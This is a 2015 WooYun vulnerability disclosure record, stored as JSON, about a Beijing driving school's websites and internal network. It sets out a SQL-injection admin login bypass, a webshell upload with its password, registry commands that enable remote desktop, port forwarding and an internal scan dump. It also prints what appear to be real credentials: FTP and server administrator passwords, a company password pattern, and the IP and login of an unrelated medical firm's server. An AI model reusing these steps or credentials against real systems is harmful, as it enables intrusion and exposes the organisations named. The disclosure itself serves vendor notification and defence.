{"id": 46255, "wybug_id": "wooyun-2015-091959", "wybug_title": "东方时尚一些安全问题导致内网渗透", "wybug_corp": "dfss.com.cn", "wybug_author": "我了个去", "wybug_date": "2015-01-15 10:40", "wybug_open_date": "2015-03-01 10:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "管理后台对外", "注入", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-01：\t细节向公众公开  简要描述： 多个安全问题，不容忽视。 详细说明：  一、服务器内网安全问题http://www.dfss-club.com/class/class.jsp?id=16   sql注入  http://www.dfss-club.com/admin/index.jsp   后台登录地址  存在万能口令  admin' or 1=1--   成功登录后台后地址  http://www.dfss-club.com/admin/MyJspkja452asdfdfdsldfijkl.jsp  getshell:登录后台后获取物理路径：E:\\Tomcat 5.0\\webapps\\club\\index.jsp结合sql注入写入菜刀一句话木马http://www.dfss-club.com/img/main.jsp    pass: testE:\\Tomcat 5.0\\webapps\\club\\img\\> whoamint authority\\system   Connection-specific DNS Suffix  . :    IP Address. . . . . . . . . . . . : 192.168.1.4   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.1.1system权限，内网机器安装有360 参考  WooYun: 轻松干掉360安全卫士主防（不止360哦）  直接秒掉  加用户 上传恶意二进制文件 改注册表毫无压力2003开启远程桌面：reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /freg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 tasklist /svc   netstat -ano 查询得知远程桌面端口33898lcx端口转发:下载lx.exe到c:\\windows目录，进行端口转发成功登录远程桌面内网扫描使用x-scan对内网进行扫描进行信息探测主机\t检测结果192.168.1.154\t发现安全漏洞主机摘要 - OS: Windows 2003; PORT/TCP: 23, 80, 135, 139, 445, 1521, 8080192.168.1.158\t发现安全漏洞主机摘要 - OS: Windows Version 6.0; PORT/TCP: 80, 135, 139, 445, 1433, 8080192.168.1.153\t发现安全漏洞主机摘要 - OS: Windows Version 6.1; PORT/TCP: 135, 139, 445, 1433, 3389192.168.1.155\t发现安全漏洞主机摘要 - OS: Windows NT 6.0; PORT/TCP: 80, 135, 139, 443, 445, 1025, 1027, 1433, 3389, 8000, 8080192.168.1.90\t发现安全漏洞主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80, 443, 8000192.168.1.4\t发现安全漏洞192.168.1.219\t发现安全漏洞主机摘要 - OS: Microsoft Windows 2003/.NET; OS details: Microsoft Windows 2003 Server; PORT/TCP: 135, 139, 445, 1025, 1521192.168.1.159\t发现安全漏洞主机摘要 - OS: Windows Version 6.0; PORT/TCP: 80, 135, 139, 445, 1433, 8080192.168.1.66\t发现安全漏洞主机摘要 - OS: Unknown OS; PORT/TCP: 21, 80, 135, 139, 445, 1521, 3306, 3389, 5800, 5900, 5901192.168.1.32\t发现安全警告主机摘要 - OS: Microsoft Windows 2003/.NET; OS details: Microsoft Windows 2003 Server; PORT/TCP: 7, 9, 13, 19, 53, 80, 135, 139, 445, 1027192.168.1.200\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 443, 8080192.168.1.107\t发现安全警告主机摘要 - OS: Microsoft Windows 2003/.NET; OS details: Microsoft Windows 2003 Server; PORT/TCP: 25, 80, 110, 135, 143, 465, 993, 995, 1025, 6000192.168.1.62\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 5800, 5900, 5901192.168.1.63\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 445, 5800, 5900, 5901192.168.1.64\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 5800, 5900, 5901192.168.1.65\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 445, 5800, 5900, 5901192.168.1.61\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 445, 3389, 5800, 5900, 5901, 8000192.168.1.99\t发现安全警告192.168.1.104\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 1025, 1521, 3389, 8080192.168.1.231\t发现安全警告主机摘要 - OS: Linux 2.4.X|2.5.X|2.6.X; OS details: Linux 2.4.18 - 2.6.7; PORT/TCP: 22, 443192.168.1.1\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 22, 23, 80, 443192.168.1.60\t发现安全警告主机摘要 - OS: Linux 2.4.X|2.5.X|2.6.X; OS details: Linux 2.4.18 - 2.6.7; PORT/TCP: 22, 111, 1521, 5900192.168.1.254\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 22, 23, 80, 443192.168.1.78\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80, 443, 8000192.168.1.101\t发现安全警告主机摘要 - OS: Microsoft Windows 2003/.NET; OS details: Microsoft Windows 2003 Server; PORT/TCP: 80, 135, 139, 445192.168.1.79\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80, 443, 8000192.168.1.85\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 22, 53192.168.1.251\t发现安全警告主机摘要 - OS: IBM AIX 4.X, Microsoft Windows 2003/.NET|NT/2K/XP; OS details: IBM AIX 4.3.2.0-4.3.3.0 on an IBM RS/*, Microsoft Windows Server 2003, Microsoft Windows XP SP2 (firewall enabled); PORT/TCP: 80, 139, 445192.168.1.120\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 80, 3389192.168.1.71\t发现安全警告主机摘要 - OS: Unknown OS; PORT/TCP: 53, 135, 139, 445, 3389192.168.1.98\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 443, 445192.168.1.96\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 443192.168.1.15\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 3389, 8000192.168.1.82\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 8080192.168.1.77\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 1433192.168.1.74\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 445, 3389192.168.1.83\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 445, 3389192.168.1.86\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 135, 139, 443, 445, 3389192.168.1.151\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 8080192.168.1.18\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 1433192.168.1.97\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 445192.168.1.84\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 445192.168.1.202\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80, 135, 139, 445, 3306, 3389, 8080192.168.1.73\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80, 111, 3306192.168.1.30\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 111, 1521192.168.1.75\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 111192.168.1.31\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 111192.168.1.33\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 111192.168.1.102\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80, 3306192.168.1.103\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80, 3306192.168.1.72\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22, 80192.168.1.50\t发现安全提示主机摘要 - OS: Microsoft Windows 2003/.NET; OS details: Microsoft Windows 2003 Server; PORT/TCP: 445192.168.1.171\t发现安全提示主机摘要 - OS: Linux 2.4.X|2.5.X|2.6.X; OS details: Linux 2.4.18 - 2.6.7, Linux 2.4.20 (Itanium), Linux 2.4.3 SMP (RedHat), Linux 2.4.7 through 2.6.3, Linux 2.6.0 (x86), Linux 2.6.0-test5 - 2.6.0 (x86), Linux 2.6.3 - 2.6.7, Linux kernel 2.6.4 (x86); PORT/TCP: 80, 3306, 8000192.168.1.114\t发现安全提示192.168.1.105\t发现安全提示192.168.1.19\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 21, 80192.168.1.22\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22192.168.1.23\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 22192.168.1.29\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 1433192.168.1.76\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 3389192.168.1.198\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 21192.168.1.13\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 80192.168.1.140\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 21192.168.1.130\t发现安全提示主机摘要 - OS: Unknown OS; PORT/TCP: 3306本机嗅探使用x-sniff对本地局域网同一交换下被动嗅探获取ftp密码 TCP  [12/24/14 18:01:03]192.168.1.4->192.168.1.198 Port: 2261->21USER rootTCP  [12/24/14 18:01:03]192.168.1.4->192.168.1.198 Port: 2261->21PASS dfss0425登录ftp，获取大量敏感信息,包括网络拓扑图，机器密码，网络设备（路由交换密码，ip分配等）  经测试，密码均可登录比如  \\\\192.168.1.154\\c$ （约车服务器）用户名administrator  密码Dfss_!@#$%^通过分析，密码很有规律，总结得出常用密码：Dfss_!@#$%^  Dfss_!@#$%^&*  Dfss_(WEBAPPNAME)!@#$%^&*  dfss0425 等虽然有些机器没开3389，但是开了smb共享，利用pstools套件里的psexec 在知道用户名密码情况下同样可以对其进行渗透。二： 咖啡厅机器没有安装还原软件或者还原卡，以及“网维” 软件，没有进行安全加固，可轻松读取机器密码，所有上网机密码一样americano ,在机器中可以提取他人上网记录和个人隐私文件。 比如，我在上网机上捡到一些东西中 其中有一个服务器的3389一个医疗体检单位的内网3389：124.207.153.74  ikangcw ikangcw    本来可以单独提交wooyun 服务器弱口令或者再来个内网渗透的，想想算了，一块提交了吧。三： 约车大厅约车机器缺陷机器刚开机初始化后，没有隐藏任务栏，可以直接对机器进行计算机常用操作，可以获取到约车客户端网段，程序打印空的约车记录单时，会报错，爆出路径同时也可以获取到约车服务端ip地址(192.168.1.154:8080)四：另外东方时尚租车网也存在注入漏洞http://www.dfsszc.com/NewsList.aspx?m=20131120105122323641%27%20and%20%27a%27=%27ahttp://www.dfsszc.com/NewsList.aspx?m=20131120105122323641%27%20and%20%27a%27=%27b   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n   修复方案：  一、咖啡厅上网机安装还原卡或还原软件（比如雨过天晴）  以及类似网吧的万象软件二、预约大厅预约机需要微调下，隐藏任务栏。三、修复sql注入漏洞，清除webshell，修改内网中服务器常用密码以及路由设备的常用密码本人刚从dfss毕业，感谢学校教授了我驾驶技能 和 颁发给我驾照，顺便问下，外地人不够5年社保，怎么搞一个京牌啊？   版权声明：转载请注明来源 我了个去@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-16 16:33 厂商回复： 感谢对我校的支持，我们已经在着手就存在的问题进行整改。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-26 12:01 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  多年后发现这个漏洞碉堡啊，改成正常rank奖励 ：）    \n     2015-09-02 19:12 |    \t\t日出东方 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:51        )\t\t \n  @疯狗 大哥给我改几个呗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}